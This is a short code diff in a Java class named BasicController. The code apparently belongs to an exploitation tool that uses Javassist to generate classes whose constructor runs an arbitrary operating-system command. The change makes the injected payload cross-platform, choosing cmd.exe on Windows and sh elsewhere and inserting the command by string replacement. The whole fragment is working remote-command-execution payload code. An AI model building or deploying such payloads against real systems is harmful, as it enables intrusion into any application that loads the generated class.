@@ -67,7 +67,8 @@ public class BasicController implements Controller {
         classFile.setAccessFlags(AccessFlag.PUBLIC);
         CtClass clazz = pool.makeClass(classFile);
 
-        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", cmd);
+        String body = "java.lang.Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"});"
+                .replace("COMMAND", cmd);
         CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
         constructor.setModifiers(Modifier.PUBLIC);
         constructor.setBody(body);
